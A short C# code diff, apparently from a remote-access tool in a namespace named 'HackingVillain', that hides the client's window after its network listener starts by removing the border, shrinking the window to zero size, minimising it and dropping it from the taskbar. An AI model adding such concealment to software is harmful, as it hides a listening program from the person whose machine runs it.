@@ -38,6 +38,11 @@ namespace HackingVillain
             });
 
             _listen.Start();
+
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.Size = new System.Drawing.Size(0, 0);
+            this.WindowState = FormWindowState.Minimized;
+            this.ShowInTaskbar = false;
         }
 
         ~Client()
